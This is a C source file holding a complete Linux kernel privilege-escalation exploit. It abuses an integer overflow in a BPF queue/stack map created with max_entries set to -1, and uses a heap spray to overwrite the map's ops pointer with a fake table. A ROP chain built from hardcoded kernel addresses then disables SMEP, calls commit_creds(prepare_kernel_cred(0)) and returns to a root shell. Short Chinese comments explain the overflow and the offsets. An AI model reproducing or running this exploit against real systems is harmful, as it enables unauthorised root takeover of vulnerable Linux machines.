#define _GNU_SOURCE
#define SPRAY_NUMBER 14

#include <signal.h>
#include <endian.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#ifndef __NR_bpf
#define __NR_bpf 321
#endif
// #define native_write_cr4 0xffffffff810037d5// 0xffffffff81097fcc
// #define POPRDX 0xffffffff81002dda
// #define DUMMY 0
// #define PREPARE_KERNEL_CRED 0xFFFFFFFF810E3D40 //0xffffffff810e3670
// #define COMMIT_CREDS  0xFFFFFFFF810E3AB0 //0xffffffff810e33e0
// #define poprdiret 0xffffffff810013b9
// #define popraxret 0xffffffff81029c71
// #define swapgs 0xffffffff81c00d5a//0xffffffff81c0095f
// #define iretq 0xffffffff8106d8f4
// #define stack_pivot_gadget 0xffffffff81954dc8
// #define stack_top_offset 0x674
// #define krop_base_to_map 0x81954000

size_t user_cs, user_rflags, user_ss, user_sp;
size_t xchg_eax_rsp_r = 0xffffffff81954dc8;
size_t p_rdi_r = 0xffffffff810013b9;
size_t p_rsi_r = 0xffffffff81001c50;
size_t push_rax_push_rsi_r = 0xffffffff81264e0b;
size_t mv_cr4_rax_r = 0xffffffff810037d5;
size_t p_rax_r = 0xffffffff81029c71;
size_t prepare_kernel = 0xffffffff810E3D40;
size_t commit_creds = 0xffffffff810E3AB0;
size_t swaqgs = 0xffffffff81c00d5a;
size_t iretq = 0xffffffff8106d8f4;
size_t mv_rdi_rax_p_r = 0x0;
uint64_t r[1] = {0xffffffffffffffff};

void Err(char* buf){
    printf("%s Error\n");
    exit(-1);
}

void getshell(){
    if(!getuid()){
        system("/bin/sh");
    }
    else{
        Err("Not root");
    }
}

void shell()
{
    puts("Get root");
    char *shell = "/bin/sh";
    char *args[] = {shell, NULL};
    execve(shell, args, NULL);
}

void getroot(){
    char* (*pkc)(int) = prepare_kernel;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
}

void savestatus(){
       __asm__("mov user_cs,cs;"
           "mov user_ss,ss;"
           "mov user_sp,rsp;"
           "pushf;"            //push eflags
           "pop user_rflags;"
          );
}

unsigned long victim[SPRAY_NUMBER];
void HeapSpry(){
    int i;
    for(i=0;i<SPRAY_NUMBER;i++){
        victim[i] = syscall(__NR_bpf, 0, 0x200011c0, 0x2c);
    }
}

void* fake_ops;
void Prepare_ROP(){
    char* rop_mem = mmap((void*)(xchg_eax_rsp_r&0xfffff000), 0x2000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    unsigned long* rop_addr = (unsigned long*)((xchg_eax_rsp_r & 0xffffffff)+0x674);
    fake_ops = mmap((void *)0xa000000000,0x8000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);

    *(unsigned long*)(xchg_eax_rsp_r&0xffffffff) = p_rax_r;
    int i = 0;
    rop_addr[i++] = p_rax_r;
    rop_addr[i++] = 0x6f0;
    rop_addr[i++] = mv_cr4_rax_r;
    rop_addr[i++] = p_rdi_r;
    rop_addr[i++] = 0;
    rop_addr[i++] = prepare_kernel;
    rop_addr[i++] = p_rsi_r;
    rop_addr[i++] = p_rdi_r;
    rop_addr[i++] = push_rax_push_rsi_r;
    rop_addr[i++] = commit_creds;

    // 
    rop_addr[i++] = swaqgs;
    rop_addr[i++] = 0;
    rop_addr[i++] = iretq;
    rop_addr[i++] = (size_t) &shell;
    rop_addr[i++] = user_cs;
    rop_addr[i++] = user_rflags;
    rop_addr[i++] = user_sp;
    rop_addr[i++] = user_ss;

    *(unsigned long*)(fake_ops+0x4000) = 0;
    *(unsigned long*)(fake_ops+0x3000) = 0;
    *(unsigned long*)(fake_ops+0x2000) = 0;
    *(unsigned long*)(fake_ops+0x1000) = 0;
    *(unsigned long*)(fake_ops) = 0;
    *(unsigned long*)(fake_ops+0x10) = xchg_eax_rsp_r;
    *(unsigned long*)(fake_ops+0x7000) = 0;
    *(unsigned long*)(fake_ops+0x6000) = 0;
    *(unsigned long*)(fake_ops+0x5000) = 0;
}

int main(){
    //signal(SIGSEGV,get_shell_again);
    //get_shell();
    syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
    long res = 0;
    *(uint32_t*)0x200011c0 = 0x17;  //map_type
    *(uint32_t*)0x200011c4 = 0;     //key_size
    *(uint32_t*)0x200011c8 = 0x40;  //value_size 需拷贝的用户字节数
    *(uint32_t*)0x200011cc = -1;    //max_entries=0xffffffff构造整数溢出
    *(uint32_t*)0x200011d0 = 0;     //map_flags
    *(uint32_t*)0x200011d4 = -1;    //inner_map_fd
    *(uint32_t*)0x200011d8 = 0;     //numa_node
    *(uint8_t*)0x200011dc = 0;
    *(uint8_t*)0x200011dd = 0;
    *(uint8_t*)0x200011de = 0;
    *(uint8_t*)0x200011df = 0;
    *(uint8_t*)0x200011e0 = 0;
    *(uint8_t*)0x200011e1 = 0;
    *(uint8_t*)0x200011e2 = 0;
    *(uint8_t*)0x200011e3 = 0;
    *(uint8_t*)0x200011e4 = 0;
    *(uint8_t*)0x200011e5 = 0;
    *(uint8_t*)0x200011e6 = 0;
    *(uint8_t*)0x200011e7 = 0;
    *(uint8_t*)0x200011e8 = 0;
    *(uint8_t*)0x200011e9 = 0;
    *(uint8_t*)0x200011ea = 0;
    *(uint8_t*)0x200011eb = 0;

    savestatus();
    puts("Prepare ROP");
    Prepare_ROP();

    puts("Alloc pbf");
    res = syscall(__NR_bpf, 0, 0x200011c0, 0x2c);
    if (res != -1)
        r[0] = res;

    puts("Heap Spry");
    HeapSpry();

    *(uint32_t*)0x200000c0 = r[0];  //map_fd,根据BPF_MAP_CREATE返回的编号找到对应的bpf对象
    *(uint64_t*)0x200000c8 = 0;     //key
    *(uint64_t*)0x200000d0 = 0x20000140;    //value,输入的缓冲区
    *(uint64_t*)0x200000d8 = 2;     //flags
    uint64_t* ptr = (uint64_t*)0x20000140;
    ptr[0]=1;
    ptr[1]=2;
    ptr[2]=3;
    ptr[3]=4;
    ptr[4]=5;
    ptr[5]=6;
    ptr[6]=fake_ops;    //从bpf_queue_stack偏移0x30处开始覆盖，因为bpf_queue_stack大小为0xd0，申请堆块为0x100，所以要偏移0x100-0xd0=0x30，bpf_map结构体开头即为bpf_map_ops指针
    ptr[7]=8;
    puts("Update bpf");
    syscall(__NR_bpf, 2, 0x200000c0, 0x20);
    *(unsigned long*)(fake_ops+0x7000) = 0;
    *(unsigned long*)(fake_ops+0x6000) = 0;
    *(unsigned long*)(fake_ops+0x5000) = 0;
    
    puts("Trigger rop");
    for(int i=0;i<SPRAY_NUMBER;i++){
        close(victim[i]);
    }
    //pause();
    return 0;



}


